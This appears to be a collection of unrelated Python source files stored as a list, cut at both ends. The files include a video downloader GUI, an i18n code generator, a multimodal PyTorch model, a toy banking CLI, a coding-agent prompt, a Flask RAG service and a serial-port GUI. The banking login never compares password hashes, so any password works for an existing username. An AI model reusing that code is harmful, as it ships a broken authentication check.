{self.ffmpeg_path}\", 'blue')\n\n\n            self.status_updated.emit(f\"Bootloader options: {ydl_opts}\", 'blue')\n\n            with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n                for url in self.urls:\n\n                    clean_url = url.split('&')[0]\n                    display_url = f\"Download started: {clean_url[:50]}...\" if len(clean_url) > 50 else f\"Download started: {clean_url}\"\n                    self.status_updated.emit(display_url, 'orange')\n                    ydl.download([clean_url])\n            self.status_updated.emit(\"All downloads complete!\", 'green')\n            self.progress_updated.emit(100)\n        except Exception as e:\n            error_details = traceback.format_exc()\n            self.download_error.emit(f\"{str(e)}\\n{error_details}\")\n\n\nclass YoutubeDownloaderApp(QMainWindow):\n    def __init__(self):\n        super(YoutubeDownloaderApp, self).__init__()\n        self.download_thread = None\n        self.cookies_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cookies.txt')\n        try:\n     ",
    "from typing import Dict, Any\nfrom pathlib import Path\nfrom jinja2 import Environment, FileSystemLoader\nfrom .base import LanguageGenerator\n\nclass CGenerator(LanguageGenerator):\n    \"\"\"C code generator using Jinja2 template\"\"\"\n    \n    def _process_language_pack(self, translations: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:\n        \"\"\"Process translation data, convert it to language pack format\"\"\"\n        language_packs = {}\n        \n        for locale, content in translations.items():\n            language_pack = {\n                'singulars': {},  # Normal text translation\n                'options': {},    # Option list translation\n            }\n            \n            # Process all translation items\n            for key, value in content.items():\n                if isinstance(value, list):\n                    # If value is a list, treat it as an option\n                    language_pack['options'][key] = value\n                else:\n                    # Otherwise, treat it as a normal text\n                    language_pack['singulars'][key] = value\n            \n            language_packs[locale] = language_pack\n        \n        return language_packs\n\n    def generate(self, translations: Dict[str, Any], output_dir: str) -> None:\n        \"\"\"Generate C language translation files\n        \n        Args:\n            translations: Translation data dictionary, format:\n                {\n                    'en': {\n                        'key1': 'value1',\n                        'key2': ['option1', 'option2'],\n                        ...\n                    },\n                    'zh': {\n                        ...\n                    },\n                    ...\n                }\n            output_dir: Output directory\n        \"\"\"\n        env = Environment(loader=FileSystemLoader(\"templates\"))\n        \n        # Process translation data\n        language_packs = self._process_language_pack(translations)\n\n        # Create output directory if it doesn't exist\n        Path(output_dir).mkdir(parents=True, exist_ok=True)\n        \n        # Generate header file\n        header_template = env.get_template(\"c_template.h.j2\")\n        header_output = header_template.render()\n        header_path = Path(output_dir) / \"multi_i18n.h\"\n        with open(header_path, \"w\", encoding=\"utf-8\") as f:\n            f.write(header_output)\n        \n        # Generate source file\n        source_template = env.get_template(\"c_template.c.j2\")\n        source_output = source_template.render(language_packs=language_packs)\n        source_path = Path(output_dir) / \"multi_i18n.c\"\n        with open(source_path, \"w\", encoding=\"utf-8\") as f:\n            f.write(source_output)\n        \n        print(f\"C translations generated at {header_path} and {source_path}\")\n",
    "import torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import DataLoader, TensorDataset\n\n# # Data Fusion Framework\n# # This framework unifies multiple data domains (e.g., text, images, sound) into a single topological space.\n# # The goal is to create a shared representation that enables seamless cross-domain understanding and transfer.\n\n# Step 1: Domain-Specific Encoders\nclass TextEncoder(nn.Module):\n    def __init__(self, input_dim, shared_dim):\n        super(TextEncoder, self).__init__()\n        self.fc = nn.Sequential(\n            nn.Linear(input_dim, 128),\n            nn.ReLU(),\n            nn.Linear(128, shared_dim)\n        )\n\n    def forward(self, x):\n        return self.fc(x)\n\n\nclass ImageEncoder(nn.Module):\n    def __init__(self, input_dim, shared_dim):\n        super(ImageEncoder, self).__init__()\n        self.fc = nn.Sequential(\n            nn.Linear(input_dim, 128),\n            nn.ReLU(),\n            nn.Linear(128, shared_dim)\n        )\n\n    def forward(self, x):\n        return self.fc(x)\n\n\nclass SoundEncoder(nn.Module):\n    def __init__(self, input_dim, shared_dim):\n        super(SoundEncoder, self).__init__()\n        self.fc = nn.Sequential(\n            nn.Linear(input_dim, 128),\n            nn.ReLU(),\n            nn.Linear(128, shared_dim)\n        )\n\n    def forward(self, x):\n        return self.fc(x)\n\n\n# Step 2: Shared Fusion Space\nclass FusionModel(nn.Module):\n    def __init__(self, shared_dim):\n        super(FusionModel, self).__init__()\n        self.shared_dim = shared_dim\n        self.text_encoder = TextEncoder(input_dim=300, shared_dim=shared_dim)  # Example input_dim for text\n        self.image_encoder = ImageEncoder(input_dim=2048, shared_dim=shared_dim)  # Example input_dim for image\n        self.sound_encoder = SoundEncoder(input_dim=1024, shared_dim=shared_dim) # Example input_dim for sound\n\n    def forward(self, text=None, image=None, sound=None):\n        representations = []\n        if text is not None:\n            representations.append(self.text_encoder(text))\n        if image is not None:\n            representations.append(self.image_encoder(image))\n        if sound is not None:\n            representations.append(self.sound_encoder(sound))\n\n        # Fusion through concatenation\n        if len(representations) > 1:\n            fused_representation = torch.cat(representations, dim=1)\n        elif len(representations) == 1:\n            fused_representation = representations[0]\n        else:\n            raise ValueError(\"At least one modality input should be provided\")\n\n        return fused_representation\n\n\n# Step 3: Training Loop\nclass FusionTrainer:\n    def __init__(self, model, learning_rate=1e-3):\n        self.model = model\n        self.criterion = nn.CosineEmbeddingLoss()\n        self.optimizer = optim.Adam(model.parameters(), lr=learning_rate)\n\n    def train(self, data_loaders, labels, modality_combinations, epochs=10):\n        for epoch in range(epochs):\n            epoch_loss = 0.0\n\n            # Create an iterator that cycles through all combinations\n            data_loaders_iter = [iter(dl) for dl in data_loaders]\n\n            i = 0\n            while i < max([len(loader) for loader in data_loaders]):\n                # Zero the parameter gradients\n                self.optimizer.zero_grad()\n\n                # Get the current modality combination\n                current_combination = modality_combinations[i % len(modality_combinations)]\n\n                # Prepare inputs for each modality\n                inputs = {}\n                modality_names = ['text', 'image', 'sound']\n                \n                try:\n                  # Select the corresponding tensors for this batch\n                  for j, modality in enumerate(modality_names):\n                      if modality in current_combination:\n                          inputs[modality] = next(data_loaders_iter[j])[0]\n                except StopIteration:\n                   # Break the inner loop if any iterator is exhausted\n                   break\n\n                # Forward pass through the FusionModel\n                fused_representation = self.model(**inputs)\n\n                # Create target tensor based on the number of modalities used\n                if len(inputs) > 1:\n                    target = torch.ones(fused_representation.shape[0], device=fused_representation.device)\n                    loss = self.criterion(fused_representation, torch.zeros_like(fused_representation), target)\n                else:\n                    target = torch.ones(fused_representation.shape[0], device=fused_representation.device)\n                    loss = self.criterion(fused_representation, torch.zeros_like(fused_representation), target)\n\n                # Backward pass and optimize\n                loss.backward()\n                self.optimizer.step()\n\n                epoch_loss += loss.item()\n                i += 1\n\n            print(f\"Epoch {epoch + 1}/{epochs}, Loss: {epoch_loss:.4f}\")\n\n\n\n# Step 4: E",
    "\"\"\"\nSetup configuration for MolOrbDraw package.\n\"\"\"\nfrom setuptools import setup, find_packages\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name=\"molorbdraw\",\n    version=\"0.1.0\",\n    author=\"MolOrbDraw Contributors\",\n    description=\"A tool for visualizing molecular orbitals from cube files\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/PhelanShao/molorbdraw\",\n    packages=find_packages(),\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Scientific/Engineering :: Chemistry\",\n        \"Topic :: Scientific/Engineering :: Visualization\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    python_requires=\">=3.7\",\n    install_requires=[\n        \"numpy>=1.19.0\",\n        \"vtk>=9.0.0\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"molorbdraw=molorbdraw.main:main\",\n        ],\n    },\n)\n",
    "# {Banking System},{Author-Arkay}\r\nfrom colorama import Fore, Back, Style, init\r\ninit()\r\nimport time\r\nimport random\r\nimport hashlib\r\nimport os\r\n\r\n\r\ndef Main_menu():\r\n    while True:\r\n          print(Style.DIM + Fore.MAGENTA + \"Welcome to Arkay Banking System\" + Style.RESET_ALL)\r\n          print()\r\n          print(\"1. Create Account.\")\r\n          print(\"2. Login.\")\r\n          print(\"3. Exit\")\r\n          print()\r\n          choice=input(\"Enter your choice:\")\r\n          if choice==\"1\":\r\n             Create_Acc()\r\n          elif choice==\"2\":\r\n             username = Login()\r\n             if username:\r\n               User_dashboard(username)\r\n          elif choice==\"3\":\r\n            print(\"Thankyou for using Arkay Banking system! Goodbye!\")\r\n            break\r\n          else:\r\n            print(\"Please enter valid choice!\")\r\n                     \r\ndef hash_password(password):\r\n   salt=os.urandom(32)\r\n   hashed_password = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)\r\n   return salt + hashed_password \r\n \r\ndef verify_password(stored_password, entered_password):\r\n    salt = stored_password[:32]  \r\n    stored_hash = stored_password[32:]  \r\n    entered_hash = hashlib.pbkdf2_hmac('sha256', entered_password.encode('utf-8'), salt, 100000)  # Hash the entered password with the same salt\r\n    return stored_hash == entered_hash   \r\n    \r\ndef Create_Acc():\r\n    print(\"__Create new account__\")\r\n    name=input(\"Enter your Name:\")\r\n    while True:\r\n         username=input(\"Enter your Username:\")\r\n         with open(\"accounts.txt\",\"a+\") as acc:\r\n             acc.seek(0)\r\n             accounts= acc.readlines()\r\n             if any (username in account for account in accounts):\r\n                 print(\"username already taken, try another one!\")\r\n             else:\r\n                 break\r\n    while True:         \r\n        password=input(\"Enter your password:\")\r\n        confirm_password=input(\"Confirm your Password:\")\r\n        if password==confirm_password:\r\n          break\r\n        else:\r\n            print(\"Password does not match!\")\r\n    salt = os.urandom(16)  # 16-byte random salt\r\n    hashed_password = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)\r\n    \r\n    # Store salt and hashed password in the file as strings (hexadecimal representation)\r\n    salt_hex = salt.hex()  # Convert to hex string for easy storage\r\n    hashed_password_hex = hashed_password.hex()  # Convert hash to hex string\r\n  \r\n            \r\n    initial_amount= 0\r\n    account_number=acc_no()\r\n   \r\n    with open(\"accounts.txt\",\"a\") as acc :\r\n        acc.write(f\"{account_number},{name},{username},{salt_hex},{hashed_password_hex},{initial_amount}\\n\")\r\n        print(\"Account created succesfully!\")\r\n        print(f\"Your Account number is: {account_number} \")\r\n          \r\ndef acc_no():\r\n    account_number=random.randint(1000,9999)\r\n    with open(\"accounts.txt\",\"r\") as acc:\r\n        accounts=acc.readlines()\r\n        used_acc_nums=[line.split(\",\")[0] for line in accounts]\r\n        while str(account_number)  in used_acc_nums:\r\n            account_number=random.randint(1000,9999)\r\n    return account_number\r\n        \r\ndef Login():\r\n   while True: \r\n       print(\"__Login to your Account__\")\r\n       username=input(\"Enter username:\")\r\n       password=input(\"Enter Password:\")\r\n       with open(\"accounts.txt\",\"r\") as acc:\r\n           accounts=acc.readlines()\r\n           for account in accounts:\r\n               account_data= account.strip().split(\",\")\r\n               if username == account_data[2]:\r\n                    # Retrieve the salt and hashed password stored in the file\r\n                    salt = bytes.fromhex(account_data[3])  # Convert from hex back to bytes\r\n                    stored_hash = bytes.fromhex(account_data[4])  # Convert from hex back to bytes\r\n                    \r\n                    # Hash the entered password with the stored salt\r\n                    entered_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)\r\n                    current_balance = float(account_data[5]) \r\n                    print(\"Login succesfully!\")\r\n                    print(f\"Welcome:{account_data[1]}, (Current Balance: \u20b9{account_data[5]}) \")\r\n                    return username\r\n              \r\n           print(\"Invalid credentials\")\r\n              \r\ndef User_dashboard(username):\r\n    while True:\r\n        print(\"__User Dashboard__\")\r\n        print(\"1. Check Balance.\")\r\n        print(\"2. Deposite.\")\r\n        print(\"3. Withdraw.\")\r\n        print(\"4. Transaction Log.\")\r\n        print(\"5. Log out\")\r\n        choice2=input(\"Enter your choice:\")\r\n        if choice2==\"1\":\r\n            check_balance(username)\r\n          \r\n        elif choice2==\"2\":\r\n            amount=input(\"Enter your Amount:\")\r\n            deposite(username,amount)\r\n        elif choice2==\"3\":\r\n            amount=input(\"Enter your Amount:\")\r\n            withdraw(username,amount)\r\n        elif choice2==\"4\":\r\n            trx_log(username)\r\n        elif ",
    "import json\nimport asyncio\nfrom typing import Dict\nfrom pathlib import Path\nfrom nonebot import require\n\nrequire(\"nonebot_plugin_localstore\")\nimport nonebot_plugin_localstore as store\n\n\nclass LastEnvious:\n    def __init__(self, last_envious: str):\n        self.lock = asyncio.Lock()\n        self.last_envious = last_envious\n    \n    def __eq__(self, other) -> bool:\n        if isinstance(other, str):\n            return self.last_envious == other\n        return NotImplemented\n\n    def __str__(self):\n        return self.last_envious\n        \n    async def update(self, envious: str) -> None:\n        async with self.lock:\n            self.last_envious = envious\n\n\nclass GroupEnviousManager:\n    def __init__(self, envious_list: list[str]):\n        self.envious_list: list[str] = envious_list.copy()\n        self.envious_file: Path = store.get_plugin_data_file(\"envious.json\")\n        self.group_envious: Dict[int, LastEnvious] = {}\n\n    def load(self):\n        if not self.envious_file.exists():\n            self.save()\n        self.envious_list = json.loads(self.envious_file.read_text())\n    \n    def save(self):\n        self.envious_file.write_text(json.dumps(self.envious_list))\n\n    def add_envious(self, envious: str):\n        if envious not in self.envious_list:    \n            self.envious_list.append(envious)\n            self.envious_list.sort(key=len, reverse=True)\n            self.save()\n        \n    async def update_last_envious(self, gid: int, envious: str):\n        last_envious: LastEnvious = self.group_envious.get(gid)\n        if last_envious:\n            await last_envious.update(envious)\n        else:\n            self.group_envious[gid] = LastEnvious(envious)\n            \n    def triggered(self, gid: int, envious: str) -> bool:\n        if last_envious := self.group_envious.get(gid):\n            return last_envious == envious\n        return False\n        \n    async def clear(self):\n        self.envious_list.clear()\n        if self.envious_file.exists():\n            self.envious_file.unlink()\n        for _, le in self.group_envious.items():\n            await le.update(\"\")\n        ",
    "from PyQt6.QtWidgets import QWidget, QVBoxLayout\nfrom matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas\nfrom matplotlib.figure import Figure\nimport librosa\nimport librosa.display\nimport numpy as np\nfrom tensorflow import keras\n\n\nclass AIQuantumMapper:\n    def __init__(self):\n        self.model = self.build_model()\n\n    def build_model(self):\n        inputs = keras.Input(shape=(2,))\n        x = keras.layers.Dense(128, activation='relu')(inputs)\n        x = keras.layers.Dense(64, activation='relu')(x)\n        x = keras.layers.Dense(32, activation='relu')(x)\n        outputs = keras.layers.Dense(16, activation='relu')(x)\n\n        model = keras.Model(inputs=inputs, outputs=outputs)\n        model.compile(optimizer='adam', loss='mse')\n        return model\n\n    def predict_quantum_states(self, frequencies, amplitudes):\n        features = np.column_stack((frequencies, amplitudes))\n        return self.model.predict(features)\n\n\nclass MelodyQuantumTab(QWidget):\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        self.audio_data = None\n        self.sample_rate = None\n        self.ai_mapper = AIQuantumMapper()\n        self.setup_ui()\n\n    def setup_ui(self):\n        layout = QVBoxLayout(self)\n        self.figure = Figure(figsize=(12, 8))\n        self.canvas = FigureCanvas(self.figure)\n        layout.addWidget(self.canvas)\n        self.setLayout(layout)\n\n    def update_audio_data(self, audio_data, sample_rate):\n        self.audio_data = audio_data\n        self.sample_rate = sample_rate\n        if self.audio_data is not None:\n            hop_length = 1024\n            self.audio_data = librosa.resample(self.audio_data, orig_sr=self.sample_rate, target_sr=22050)\n            self.sample_rate = 22050\n            self.analyze_melody_quantum()\n\n    def analyze_melody_quantum(self):\n        if self.audio_data is None:\n            return\n\n        try:\n            self.figure.clear()\n\n            ax1 = self.figure.add_subplot(311)\n            D = librosa.stft(self.audio_data, n_fft=2048, hop_length=1024)\n            phases = np.angle(D)\n            img = librosa.display.specshow(\n                phases,\n                y_axis='log',\n                x_axis='time',\n                sr=self.sample_rate,\n                ax=ax1,\n                cmap='hsv'\n            )\n            ax1.set_title('Quantum Phase Evolution')\n            self.figure.colorbar(img, ax=ax1, format='%+2.0f \u03c0')\n\n            ax2 = self.figure.add_subplot(312)\n            harmonic = librosa.effects.harmonic(y=self.audio_data, margin=4)\n            D_harmonic = librosa.amplitude_to_db(np.abs(librosa.stft(harmonic, hop_length=1024)), ref=np.max)\n            librosa.display.specshow(\n                D_harmonic,\n                y_axis='log',\n                x_axis='time',\n                ax=ax2\n            )\n            ax2.set_title('Harmonic-Quantum Coupling')\n\n            ax3 = self.figure.add_subplot(313)\n            chroma = librosa.feature.chroma_cqt(\n                y=self.audio_data,\n                sr=self.sample_rate,\n                hop_length=1024,\n                n_chroma=12\n            )\n            librosa.display.specshow(\n                chroma,\n                y_axis='chroma',\n                x_axis='time',\n                ax=ax3\n            )\n            ax3.set_title('Note-State Distribution')\n\n            self.figure.tight_layout()\n            self.canvas.draw()\n\n        except Exception as e:\n            print(f\"Error in melody quantum analysis: {str(e)}\")\n",
    "# Python package supporting common text-to-speech engines \r\nimport pyttsx3 \r\n\r\n# For understanding speech \r\nimport speech_recognition as sr \r\n\r\n# For fetching the answers \r\n# to computational queries \r\nimport wolframalpha \r\n\r\n# for fetching wikipedia articles \r\nimport wikipedia \r\n\r\n\r\n# Function to search the query \r\n# that is either entered or spoken \r\n# by user \r\ndef search(query): \r\n\t\r\n\t# try is used for searching with wolframAlpha \r\n\ttry: \r\n\t\t\r\n\t\t# Generate your App ID from WolframAlpha \r\n\t\tapp_id = \"Your WolframAlpha App ID here\"\r\n\t\tclient = wolframalpha.Client(app_id) \r\n\t\tres = client.query(query) \r\n\t\tanswer = next(res.results).text \r\n\t\tprint(answer) \r\n\t\tSpeakText(\"Your answer is \" + answer) \r\n\t\t\r\n\t# If the query cannot be searched using \r\n\t# WolframAlpha then it is searched in \r\n\t# wikipedia \r\n\texcept: \r\n\t\t\r\n\t\tquery = query.split(' ') \r\n\t\tquery = \" \".join(query[0:]) \r\n\t\t\r\n\t\tSpeakText(\"I am searching for \" + query) \r\n\t\tprint(wikipedia.summary(query, sentences = 3)) \r\n\t\tSpeakText(wikipedia.summary(query, sentences = 3)) \r\n\t\t\r\n\t\r\n# Function to convert text to \r\n# speech \r\ndef SpeakText(command): \r\n\t\t\r\n\t# Initialize the engine \r\n\tengine = pyttsx3.init() \r\n\tengine.say(command) \r\n\tengine.runAndWait() \r\n\r\n\t\r\n# Driver's code \r\n# input query from the user by \r\n# typing or by voice \r\nquery = input() \r\nquery = query.lower() \r\n\r\n# if query is blank then user \r\n# is prompted to speak something. \r\nif query == '': \r\n\tr = sr.Recognizer() \r\n\r\n\t# uses the default microphone \r\n\t# as the source to record voice \r\n\twith sr.Microphone() as source: \r\n\t\tprint(\"Say Something \") \r\n\r\n\t\t# reduces the background disturbances \r\n\t\t# and noise for 2 seconds \r\n\t\tr.adjust_for_ambient_noise(source, 2) \r\n\t\t\r\n\t\t# listening to source \r\n\t\taudio = r.listen(source) \r\n\ttry: \r\n\t\tspeech = r.recognize_google(audio) \r\n\t\tsearch(speech) \r\n\r\n\t# Handling Exceptions if speech \r\n\t# is not understood. \r\n\texcept sr.UnknownValueError: \r\n\t\tprint(\"Google Speech Recognition could not \\ understand audio\") \r\n\r\n\t# Couldn't handle requests, occurs \r\n\t# mainly because of network errors \r\n\texcept sr.RequestError as e: \r\n\t\tprint(\"Could not request results from Google \\ Speech Recognition service;{0}\".format(e)) \r\nelse: \r\n\tsearch(query) \r\n\r\n",
    "agent_prompt = \"\"\"\nYou are an independent coding assistant that helps human users write proper code and make coding projects. Being independent, you have the ability to list items in the directory, read them, write code to file, execute Powershell commands, etc. using tools. Use tools properly and create proper flow of tasks to accomplish the task asked by the user. [IMPORTANT] Always read either all the files, or at least the important files to get some context about what's going on in the directory before making changes or answering questions.\nYou have access to the following tools:\n\n{tools}\nALWAYS follow the datatype of arguments as mentioned in tool's descriptions.\n\nYou MUST follow all these steps without missing a single steps.\nTo use a tool, please use the following format:\n\nQuestion: the input question you must answer\nThought: you should always think about what to do   \nTool Thought: Do I need to use a tool? Yes\nAction: the action to take, should be one of [{tool_names}]\nAction Input: the input to the action\nObservation: the result of the action\n... (this Thought/Tool Thought/Action/Action Input/Observation can repeat N times, but don't repeat indefinitely)\nThought: I now know the final answer\nFinal Answer: the final answer to the original input question.\n\n\nWhen you have a response to say to the Human, or if you do not need to use a tool, you MUST use the format:\n\nThought: Do I need to use a tool? No\nFinal Answer: [your response here]\n\nIf your code produces an error, try fixing the errors yourself. If it isn't fixed, you can use internet.\n\nWhile surfing the internet, use the following flow:\n1. Use Search Internet tool to retrieve relevant links of web pages to surf.\n2. Open the best page that you think has the solution to problem encountered or with using the links retrieved from step 1. Use Open Page tool for this. \n3. Extract HTML tags and css selectors to get proper context about website and get useful CSS selectors that should be used.\n4. Then only proceed to clicks and typing into field as per requirement. Without getting idea about HTNML Tags and CSS selectors, don't use random selectors without getting any idea.\n5. Finally, close the browser. Don't forget to do close browser.\nIf you get enough after using Search Internet tool, don't repeat the other things.\nNOTE: \ni. STRICTLY do not use markdown components like ``` or any other components anywhere, no text styling like bold, italics, etc either.\nii. [IMPORTANT] Always read either all the files, or atleast the main files to get some context about what's going on in the directory before starting to make changes and answer questions.\niii. [IMPORTANT] Use the Current Working Directory tool often to know where you are working and use full directory name as arguments while using other tools. Example: Use C:/apple/apple.py instead of apple. \nPrevious conversation history:\n{chat_history}\nLast 1 conversation:\n{last_conversation}\n\nNew input: {input}\n{agent_scratchpad}\n\"\"\"\n",
    "import os\nimport time\nfrom flask import (\n    Flask,\n    request,\n    jsonify\n)\nfrom langchain_community.document_loaders.sitemap import SitemapLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_core.prompts import PromptTemplate\nfrom langchain_community.vectorstores import Chroma\nfrom langchain.chains import RetrievalQA\nfrom chat import chat, embedding\n\nSITEMAP_URL = os.environ.get(\"SITEMAP_URL\")\nif SITEMAP_URL is None:\n    raise ValueError(\"SITEMAP_URL is not set\")\n\napp = Flask(__name__)\n\nmodel_name = \"llama3.2:1b\"\n\ndef load_documents():\n    if os.getenv(\"AVOID_SSL_VERIFY\", False):\n        sitemap_loader = SitemapLoader(SITEMAP_URL, verify_ssl=False)\n    else:\n        sitemap_loader = SitemapLoader(SITEMAP_URL)\n    docs = sitemap_loader.load()\n    return docs\n\n\ndef sentences_as_chunks(chunk_size=512):\n    text_splitter = RecursiveCharacterTextSplitter(  # Set a really small chunk size, just to show.\n        chunk_size=chunk_size,\n        chunk_overlap=0,\n        length_function=len,\n        is_separator_regex=False)\n    return text_splitter.split_documents(load_documents())\n\n\ndef retriever():\n    return Chroma.from_documents(documents=sentences_as_chunks(), embedding=embedding)\n\nprompt_template = \"\"\"\"Use the following pieces of context to answer the question at the end.\n    If you don't know the answer, just say that you don't know, don't try to make up an answer.\n    Use three sentences maximum and keep the answer as concise as possible.\n    {context}\n    Question: {question}\n    Helpful Answer:\n\"\"\"\n\nprompt = PromptTemplate(\n    input_variables=[\"context\", \"question\"],\n    template=prompt_template,\n)\n\nprint(\"Building QA chain...\")\nstart_time = time.time()\nqa_chain = RetrievalQA.from_chain_type(chat, retriever=retriever().as_retriever(), chain_type_kwargs={\"prompt\": prompt})\nprint(f\"QA chain built in {time.time() - start_time} seconds.\")\n\n@app.route(\"/api/predict\")\ndef predict():\n    query = request.args.get('q', '')\n    result = qa_chain.invoke({\"query\": query})\n    return jsonify(result)\n",
    "# GUI design\nimport tkinter as tk\nfrom tkinter import scrolledtext\n\n# Communication with serial port\nimport serial\nfrom serial.tools import list_ports\n\n# Multi-threading\nimport threading\n\n# Get path\nimport os\n\n#mathematics\nimport numpy as np\n\n#import sys\n#import glob\nfrom matplotlib import pyplot as plt\n\n#others for calibration\nfrom scipy import linalg\nfrom functools import reduce\nimport operator\n\n#elapsed time\nimport time\n\n# Use realpath if you want the real path (symlinks are resolved)\n# file_path = os.path.realpath(__file__)\nFILE_PATH = os.path.abspath(__file__)\nICON_PATH = os.path.join(os.path.dirname(__file__), \"icon.png\")\n\n\nclass GUI:\n    # GUI main class\n    def __init__(self, title):\n\n        self.portNamesList = []\n        self.baudRatesList = [\n            1200,\n            2400,\n            4800,\n            9600,\n            19200,\n            38400,\n            57600,\n            115200,\n            230400,\n            460800,\n            576000,\n            921600,\n        ]\n        self.sensorsList = [\n            'G',\n            'A',\n            'M',\n            '-']\n        self.isAnyPortAvailable = False\n        self.isStarted = False\n        self.serialPortName = None\n        self.serialPortBaud = 9600\n\n        self.serialPortManager = SerialPortManager(self.serialPortBaud)\n        self.get_available_serial_ports()\n\n        self.guiUpdateInterval = 40\n\n        self.scroll_lock = False\n\n        self.window = tk.Tk()\n        # Title of application window\n        self.window.title(title)\n        # Icon of application window\n        self.window.iconphoto(False, tk.PhotoImage(file=ICON_PATH))\n\n        self.topFrame = tk.Frame(self.window, bg=\"#cccccc\")\n\n        self.scanButton = tk.Button(\n            self.topFrame,\n            text=\"Scan Serial Ports\",\n            bg=\"#0051ff\",\n            fg=\"#ffffff\",\n            border=0,\n            highlightbackground=\"#ffffff\",\n            highlightthickness=2,\n            activebackground=\"#1f7cff\",\n            activeforeground=\"#ffffff\",\n            font=(\"Sans\", \"10\", \"bold\"),\n            command=self.scan_button_command,\n        )\n\n        # Define a tk.StringVar for storing selected item in OptionMenu\n        self.selectedPort = tk.StringVar()\n        # Set default value of selectedPort\n        if self.isAnyPortAvailable == False:\n            self.portNamesList = [\"No ports available\"]\n        self.selectedPort.set(self.portNamesList[0])\n\n        self.portsOptionMenu = tk.OptionMenu(\n            self.topFrame, self.selectedPort, *self.portNamesList\n        )\n\n        self.portsOptionMenu.configure(\n            bg=\"#ffffff\",\n            fg=\"#222222\",\n            border=0,\n            highlightbackground=\"#aaaaaa\",\n            activebackground=\"#eeeeee\",\n            activeforeground=\"#111111\",\n            direction=\"left\",\n            font=(\"Sans\", \"10\", \"bold\"),\n        )\n        if self.isAnyPortAvailable == False:\n            self.portsOptionMenu.configure(state=\"disabled\")\n\n        # Define a tk.IntVar for storing selected item in OptionMenu\n        self.selectedBaudRate = tk.IntVar()\n        # Set default value of selectedBaudRate\n        self.selectedBaudRate.set(self.baudRatesList[3])\n        self.baudRatesOptionMenu = tk.OptionMenu(\n            self.topFrame, self.selectedBaudRate, *self.baudRatesList\n        )\n\n        self.baudRatesOptionMenu.configure(\n            bg=\"#ffffff\",\n            fg=\"#222222\",\n            border=0,\n            highlightbackground=\"#aaaaaa\",\n            activebackground=\"#eeeeee\",\n            activeforeground=\"#111111\",\n            direction=\"left\",\n            font=(\"Sans\", \"10\", \"bold\"),\n        )\n        if self.isAnyPortAvailable == False:\n            self.baudRatesOptionMenu.configure(state=\"disabled\")\n\n       # Define a tk.IntVar for storing selected item in OptionMenu\n        self.selected_sensor = tk.StringVar()\n        # Set default value of selected_sensor\n        self.selected_sensor.set(self.sensorsList[3])\n        self.selectedSensorOptionMenu = tk.OptionMenu(\n            self.topFrame, self.selected_sensor, *self.sensorsList\n        )\n\n        self.selectedSensorOptionMenu.configure(\n            bg=\"#ffffff\",\n            fg=\"#222222\",\n            border=0,\n            highlightbackground=\"#aaaaaa\",\n            activebackground=\"#eeeeee\",\n            activeforeground=\"#111111\",\n            direction=\"left\",\n            font=(\"Sans\", \"10\", \"bold\"),\n        )\n\n        self.connectButton = tk.Button(\n            self.topFrame,\n            text=\"Connect\",\n            bg=\"#00a832\",\n            fg=\"#ffffff\",\n            border=0,\n            highlightbackground=\"#ffffff\",\n            highlightthickness=2,\n            activebackground=\"#3fcc69\",\n            activeforeground=\"#ffffff\",\n            font=(\"Sans\", \"10\", \"bold\"),\n            command=self.start_button_command,\n        )\n\n        self.sendPEMC09Button = tk.Button(\n            self.topFrame,\n            text=\"Receive raw data from sensors\",\n       ",
    "import argparse\nimport csv\nimport os\nfrom datetime import datetime, timedelta\n\nimport requests\n\n\n# Default GitHub API headers with optional token\ndef get_headers():\n    \"\"\"Get headers.\"\"\"\n    token = os.getenv(\"GITHUB_TOKEN\")\n    headers = {}\n    if token:\n        headers[\"Authorization\"] = f\"token {token}\"\n    return headers\n\n\ndef get_repo_count(language, min_stars, max_stars, min_forks):\n    \"\"\"Get the total count of repositories matching the query.\"\"\"\n    url = \"https://api.github.com/search/repositories\"\n    params = {\n        \"q\": f\"language:{language} stars:{min_stars}..{max_stars} forks:>={min_forks}\",\n    }\n\n    response = requests.get(url, headers=get_headers(), params=params)\n    log_rate_limit_info(response)  # Log rate limit information\n\n    if response.status_code == 200:\n        return response.json().get(\"total_count\", 0)\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return 0\n\n\ndef display_final_rate_limit():\n    \"\"\"Display final rate limit information after processing.\"\"\"\n    url = \"https://api.github.com/rate_limit\"\n    response = requests.get(url, headers=get_headers())\n    if response.status_code == 200:\n        rate_limit = response.json().get(\"rate\", {})\n        remaining = rate_limit.get(\"remaining\", \"unknown\")\n        limit = rate_limit.get(\"limit\", \"unknown\")\n        reset_time = rate_limit.get(\"reset\")\n        if reset_time:\n            reset_time = datetime.fromtimestamp(int(reset_time)).strftime(\n                \"%Y-%m-%d %H:%M:%S\"\n            )\n        print(f\"\\nFinal API Rate Limit: {remaining}/{limit} requests remaining.\")\n        print(f\"Rate limit resets at: {reset_time}\")\n    else:\n        print(\"\\nUnable to fetch final rate limit information.\")\n\n\ndef log_rate_limit_info(response):\n    \"\"\"Log API rate limit information from response headers.\"\"\"\n    limit = response.headers.get(\"X-RateLimit-Limit\", \"unknown\")\n    remaining = response.headers.get(\"X-RateLimit-Remaining\", \"unknown\")\n    reset_time = response.headers.get(\"X-RateLimit-Reset\")\n\n    if reset_time:\n        reset_time = datetime.fromtimestamp(int(reset_time)).strftime(\n            \"%Y-%m-%d %H:%M:%S\"\n        )\n\n    